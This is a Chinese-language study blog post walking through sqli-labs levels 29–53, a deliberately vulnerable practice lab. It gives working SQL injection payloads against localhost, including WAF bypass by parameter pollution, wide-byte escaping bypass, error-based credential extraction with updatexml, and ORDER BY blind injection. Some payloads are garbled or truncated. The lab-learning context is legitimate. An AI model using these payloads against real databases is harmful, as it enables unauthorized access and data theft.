---
title: sqli-lab:Less29-53记录
date: 2017-12-09 08:30:17
tags:
    - web安全
---

## 0x00

最近开始学习注入，从sqli-lab的题入手。前面1-28是跟着教程做的，学习了注入基本的方法和思路。后面试着自己做一下，同时留下思路和笔记。

## Less-29

### GET受WAF保护单引号注入

测试：

![](/img/sql/21.png)

结果跳转到了另一个页面,结合登录网站的图片提示，我们知道有waf。看看源码。

![](/img/sql/12.png)

看看`java_implimentation`和`whitelist`这个两个处理传入参数的函数。

![](/img/sql/1.png)

java\_implimentation用来解析查询字符串，用`&`分割参数，并只返回参数`id`的值且只返回第一次。

![](/img/sql/guolv.png)

这是主要的检测函数，检测传入的参数是否是一个纯数字，如果不是，则判定为非法字符，跳转到特殊页面。

根据WAF规则构造出payload：

> http://localhost/Less-29/login.php?id=0\&id=0‘") union select 1,2,3 –+

前一个`id=0`用于绕过waf，而代码中执行的sql语句使用的是`$_GET['id']`,这个值取的是最后一个GET的id的值，也就是payload中&后面的id的值。

## Less-30

### GET受WAF保护双引号注入

这一关跟上一关差不多，区别在于sql语句使用的参数加了双引号。如下payload可以检测出：

> http://localhost/Less-30/login.php?id=1\&id=1%22"

![](/img/sql/error.png)

构造payload：

> http://localhost/Less-30/login.php?id=1\&id=0%22%20union%20select%201,2,3%20--+"

## Less-31

### GET受WAF保护括号注入

跟上面大同小异,从报错可以看出参数闭合的方式。 &#x20;
payload：

> http://localhost/Less-31/login.php?id=1\&id=0%22)%20union%20select%201,2,3%20--+")%20union%20select%201,2,3%20--+)

## Less-32

### GET字符型addslashes绕过注入

测试：

> http://localhost/Less-32/?id=1%df%27"

![](/img/sql/error1.png)

从报错看出单引号被添加了一个斜杠。

源码：

![](/img/sql/so.png)

`check_addslashes`函数：

![](/img/sql/han.png)

参数经过`check_addslashes`函数处理，斜杠和单双引号都被添加了斜杠转义。看到执行了`SET NAMES gbk`，想到可以使用宽字节注入绕过。

payload：

> http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+"

## Less-33

### GET字符型addslashes绕过注入

和Less-32注入方法一模一样，查看源码区别在于`check_addslashes`使用了php自带的函数`addslashes`，观察实际使用效果结合查询手册，学习了addslashes函数的原理。和绕过方法。

## Less-34

### POST字符型addslashes绕过注入

和之前GET的原理相同。区别在于数据改为POST传输。

在测试中，我直接用浏览器输入`1%df'`不会报错，只有在bp的repeater中修改payload再POST出去才会报错。

使用bp抓包发现，在浏览器中POST的`1%df'`会被编码为`1%25df`，即`%`被编码了。这样就无法构成宽字节了。

## Less-35

### GET数字型addslashes绕过注入

测试：

`http://localhost/Less-35/?id=1%df%27`

报错：

![](/img/sql/error2.png)

源码：

![](/img/sql/sou2.png)

发现是数字型的id，那么在注入时addslashes函数就不会起到什 &#x20;
么作用。

payload:

> http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+"

## Less-36

### GET字符型mysql\_real\_escape\_string绕过注入

跟前几题类似，区别在于转义字符串的函数换成了`mysql_real_escape_string`,在参考手册中查一下。

![](/img/sql/mysql_escape.png)

注入方法和之前的一样。

payload:

> http://localhost/Less-36/?id=0%df%27%20union%20select%201,2,3%20--+"

## Less-37

### POST字符型mysql\_real\_escape\_string绕过注入

只是换了转义函数，注入方法同Less-34。

## Less-38

### GET字符型层次化查询注入

源码：

![](/img/sql/stacked.png)

代码使用了`mysqli`拓展连接数据库的方式。`mysqli_multi_query`执行多个sql语句，以`；`分隔。`mysqli_more_results`检查是否还有查询数据。

payload：

http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+"

## Less-39

### GET数字型层次化查询注入

测试：

> http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+"

报错：

![](/img/sql/error3.png)

判断应为数字型注入

payload:

> http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+"

## Less-40

### GET括号字符型层次化查询盲注

测试：

> http://localhost/Less-40/index.php?id=0%20or%201=1%20--+"
>
> http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+"
>
> http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+")%20or%201=1%20--+)

前两个无回显，第三个登陆成功。

payload:

> http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+")%20union%20select%201,2,3%20--+)

## Less-41

### GET数字型层次化查询盲注

测试：

> http://localhost/Less-41/?id=0%27%20or%201=1%20--+"
>
> http://localhost/Less-41/?id=0%20or%201=1%20--+"

判定为数字型注入

payload:

> localhost/Less-41/?id=0 union select 1,2,3 –+

## Less-42

### POST字符型基于错误的的层次化查询注入

源码：

![](/img/sql/escape0.png)

转义了用户名但没有转义密码，联想到之前Less-24的二次注入。但是发现这次不让注册了。。。看到会报错，尝试使用less-27学的基于报错的`updatexml`语法。

payload:

> login\_user=root\&login\_password=1’ or updatexml(1,concat(0x2829,(select version())),1) –+\&mysubmit=Login
>
> login\_user=root\&login\_password=1’ or extractvalue(1,concat(0x2829,(select version()),1) –+\&mysubmit=Login
>
> login\_user=root\&login\_password=1’ or updatexml(1,concat(0x2829,(select concat\_ws(‘:’,id,username,password) from users limit 0,1)),1) –+\&mysubmit=Login

之后就可以登陆改密码啦。

## Less-43

### POST加括号字符型基于错误的的层次化查询注入

测试：

> login\_user=root\&login\_password=0’ or 1=1 –+\&mysubmit=Login
>
> login\_user=root\&login\_password=0’) or 1=1 –+\&mysubmit=Login

测试出sql语句是`')`闭合，payload与上题类似。

> login\_user=root\&login\_password=1’） or updatexml(1,concat(0x2829,(select version())),1) –+\&mysubmit=Login

## Less-44

### POST字符型层次化查询盲注

测试：

> login\_user=root\&login\_password=0’ or 1=1 –+\&mysubmit=Login
>
> login\_user=root\&login\_password=0” or 1=1 –+\&mysubmit=Login

发现这题没有回显了，使用boolenBased盲注。

payload:

> 64 –+\&mysubmit=Login

可以写脚本跑或是sqlmap跑

## Less-45

### POST括号字符型层次化查询盲注

测试：

> login\_user=root\&login\_password=0’ or 1=1 –+\&mysubmit=Login
>
> login\_user=root\&login\_password=0’) or 1=1 –+\&mysubmit=Login

测试出sql语句是`')`闭合，payload与上题类似。

payload：

> 64 –+\&mysubmit=Login

## Less-46

### GET数字型基于错误的orderby从句注入

测试：

> http://localhost/Less-46/?sort=1%27%20or%201=1%20--+"
>
> http://localhost/Less-46/?sort=1%20%20or%201=1%20--+"

判断为数字型注入

> http://localhost/Less-46/?sort=1%20%20desc"

orderby从句注入

源码：

![](/img/sql/order.png)

`order by`从句的注入，查了一下，感觉跟之前的也是大同小异。有报错还是可以使用`updatexml`或是`extractvalue`。

payload：

> http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+"

## Less-47

### GET字符型基于错误的orderby从句注入

测试：

> http://localhost/Less-46/?sort=1%27%20or%201=1%20--+"
>
> http://localhost/Less-46/?sort=1%20%20or%201=1%20--+"

判断为字符型注入

payload：

> http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+"

## Less-48

### GET数字型的orderby从句盲注

测试:

> http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(无回显)
>
> http://localhost/Less-48/?sort=0%20or%201=1%20%20--+（有回显）

数字型

尝试了使用boolenBased注入。常规的boolenBased方式用不了，上网查了查

payload：

> http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00"

原理为1与`if`语句正则匹配，database()第一个字符=0x73为真则if为1，则regexp匹配结果为1，否则为0。

sqlmap跑的payload：

> \[http://localhost/Less-48/?sort=(select](http://localhost/Less-48/?sort=(select)")(case when (7459=7459) then 7459 else 7459 \*(select 7459 from information\_schema.plugins) end))

## Less-49

### GET字符型orderby从句盲注

测试：

> http://localhost/Less-49/?sort=0%20or%201=1"

payload：

> http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+"

sqlmap跑user()的盲注语句：

> -   THEN 3452 ELSE 3452 \_(SELECT 3452 FROM INFORMATION\_SCHEMA.PLUGINS)\
>     END))

## Less-50

### GET数字型orderby从句层次化查询注入

测试：

> http://localhost/Less-50/?sort=0%27%20or%201=1%20--+"
>
> http://localhost/Less-50/?sort=0%20or%201=1%20--+"
>
> http://localhost/Less-50/?sort=0%20desc--+"

判断为数字型orderby从句注入

payload同`Less46`

## Less-51

### GET字符型orderby从句层次化查询注入

测试：

> http://localhost/Less-51/?sort=0%27%20or%201=1%20--+"
>
> http://localhost/Less-51/?sort=0%20or%201=1%20--+"
>
> http://localhost/Less-51/?sort=0%27%20desc--+"

单引号字符型orderby从句注入

payload同`Less-47`

## Less-52

### GET数字型orderby从句层次化查询盲注

测试:

> http://localhost/Less-52/?sort=0%27%20or%201=1%20--+"
>
> http://localhost/Less-52/?sort=0%20or%201=1%20--+"
>
> http://localhost/Less-52/?sort=0%27%20desc--+"

数字型orderby从句注入

payload同Less-48

## Less-53

### GET字符型orderby从句层次化查询盲注

测试:

> http://localhost/Less-53/?sort=0%27%20or%201=1%20--+"
>
> http://localhost/Less-53/?sort=0%20or%201=1%20--+"
>
> http://localhost/Less-53/?sort=0%27%20desc--+"

字符型orderby从句注入

payload同Less-49

## 总结

从这一部分中学到了一些`绕过注入`、`层次化查询注入`和`orderby从句注入`的一些思路。学到了很多东西，但是感觉这一部分的题目重复性有些偏大，套路有点单一。

